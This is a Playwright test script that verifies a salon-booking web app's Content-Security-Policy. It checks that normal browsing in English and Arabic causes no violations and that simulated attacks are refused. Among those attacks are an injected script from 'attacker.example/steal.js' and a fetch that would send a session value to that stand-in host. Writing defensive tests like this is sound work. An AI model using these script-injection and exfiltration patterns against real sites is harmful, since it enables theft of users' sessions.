// The site's Content-Security-Policy: everything the app does still works,
// and what an injected script would do does not.
//
//   BASE=http://localhost:4173/ node scripts/browser-tests/23-security-policy.mjs
//
// From the third audit (L5). The sign-in session sits in localStorage, so any
// script that ran on the page could read it. Nothing injects markup today; the
// policy is the second lock. Two halves, both needed: a policy that blocks the
// app is a broken site, and one that blocks nothing is a decoration. So this
// browses both sides in both languages counting violations — there must be
// none — and then tries four things an attacker's script would, each of which
// must be refused. Runs against a build: the policy is injected at build time.
import { chromium } from 'playwright';

const BROWSER = process.env.CHROMIUM || '/opt/pw-browsers/chromium';
const BASE = process.env.BASE || 'http://localhost:4173/';
const REF = 'nicdmspejrvruszlwhvm';
// One pixel, so an image from Supabase storage really loads.
const PNG = Buffer.from(
  'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==',
  'base64',
);

const ok = (route, body) => route.fulfill({ status: 200, contentType: 'application/json',
  headers: { 'access-control-allow-origin': '*' }, body: JSON.stringify(body) });

const results = [];
const check = (n, v, d = '') => { results.push(v); console.log(`${v ? 'PASS' : 'FAIL'}  ${n}${v || !d ? '' : ` — ${d}`}`); };
const browser = await chromium.launch({ executablePath: BROWSER });

async function open(arabic) {
  const page = await browser.newPage({ viewport: { width: 500, height: 900 } });
  // Every violation the page meets, recorded before any app code runs.
  await page.addInitScript(() => {
    window.__violations = [];
    document.addEventListener('securitypolicyviolation', (e) => {
      window.__violations.push(`${e.violatedDirective} ${e.blockedURI}`);
    });
  });
  await page.route(`**/${REF}.supabase.co/**`, (route) => {
    const url = route.request().url();
    if (route.request().method() === 'OPTIONS') {
      return route.fulfill({ status: 204, headers: { 'access-control-allow-origin': '*',
        'access-control-allow-headers': '*', 'access-control-allow-methods': '*' } });
    }
    if (url.includes('/storage/v1/object/')) {
      return route.fulfill({ status: 200, contentType: 'image/png', body: PNG,
        headers: { 'access-control-allow-origin': '*' } });
    }
    return ok(route, []);
  });
  // Nothing may reach anywhere else; if the policy failed, this would show it.
  await page.route('https://attacker.example/**', (route) => route.fulfill({ status: 200, body: 'x' }));
  await page.goto(BASE, { waitUntil: 'networkidle' });
  if (arabic) { await page.getByRole('button', { name: 'العربية' }).click(); await page.waitForTimeout(300); }
  return page;
}

const violations = (page) => page.evaluate(() => window.__violations.slice());

for (const arabic of [false, true]) {
  const L = arabic ? 'AR' : 'EN';
  const page = await open(arabic);

  const tag = page.locator('meta[http-equiv="Content-Security-Policy"]');
  const policy = (await tag.count()) ? await tag.getAttribute('content') : null;
  check(`${L}: the built page carries a policy`, Boolean(policy));
  check(`${L}: scripts only from the site itself`, /script-src 'self'(;|$)/.test(policy ?? ''), policy ?? '');
  check(`${L}: connections only to the site and its Supabase project`,
        (policy ?? '').includes(`connect-src 'self' https://${REF}.supabase.co`), policy ?? '');

  // Browse: the customer side, a salon, back, the salon owner's side.
  await page.getByRole('button', { name: /I'm a customer|أنا عميل/i }).first().click();
  await page.waitForTimeout(900);
  const salon = page.locator('button', { hasText: /Maison Noir|ميزون نوار/ }).first();
  if (await salon.count()) { await salon.click(); await page.waitForTimeout(700); }
  await page.goto(BASE, { waitUntil: 'networkidle' });
  if (arabic) { await page.getByRole('button', { name: 'العربية' }).click(); await page.waitForTimeout(300); }
  await page.getByRole('button', { name: /I own a salon|أملك صالون/i }).first().click();
  await page.waitForTimeout(900);

  // A salon photograph, served from Supabase storage, is allowed.
  const photo = await page.evaluate(async (ref) => new Promise((resolve) => {
    const img = new Image();
    img.onload = () => resolve(true);
    img.onerror = () => resolve(false);
    img.src = `https://${ref}.supabase.co/storage/v1/object/public/salon-photos/x/gallery/a.png`;
  }), REF);
  check(`${L}: a photograph from Supabase storage loads`, photo);

  const seen = await violations(page);
  check(`${L}: browsing both sides meets no violation at all`, seen.length === 0, seen.join(' | '));

  // Now the attacker's half. Each must be refused.
  const inline = await page.evaluate(() => {
    window.__ran = false;
    const s = document.createElement('script');
    s.textContent = 'window.__ran = true';
    document.head.appendChild(s);
    return window.__ran;
  });
  check(`${L}: an injected inline script does not run`, inline === false);

  const foreign = await page.evaluate(() => new Promise((resolve) => {
    const s = document.createElement('script');
    s.src = 'https://attacker.example/steal.js';
    s.onload = () => resolve('loaded');
    s.onerror = () => resolve('blocked');
    document.head.appendChild(s);
  }));
  check(`${L}: a script from another site does not load`, foreign === 'blocked', foreign);

  const exfil = await page.evaluate(() => fetch('https://attacker.example/c?session=x')
    .then(() => 'sent').catch(() => 'blocked'));
  check(`${L}: the page cannot send anything to another site`, exfil === 'blocked', exfil);

  // Code from a string, run later as ordinary page code. Calling eval directly
  // here would prove nothing: Playwright's evaluate travels the developer-tools
  // channel, which the browser exempts from the page's eval rule on purpose.
  const evaluated = await page.evaluate(() => new Promise((resolve) => {
    window.__evaluated = false;
    setTimeout('window.__evaluated = true', 0);
    setTimeout(() => resolve(window.__evaluated), 200);
  }));
  check(`${L}: code built from a string does not run`, evaluated === false, String(evaluated));

  const after = await violations(page);
  check(`${L}: and each refusal was the policy's doing`,
        after.some((v) => v.startsWith('script-src') && v.includes('inline'))
        && after.some((v) => v.includes('attacker.example/steal.js'))
        && after.some((v) => v.startsWith('connect-src') && v.includes('attacker.example'))
        && after.some((v) => v.startsWith('script-src') && v.includes('eval')),
        after.join(' | '));
  await page.close();
}

await browser.close();
const failed = results.filter((r) => !r).length;
console.log(`\n${results.length - failed}/${results.length} checks passed`);
process.exit(failed ? 1 : 0);
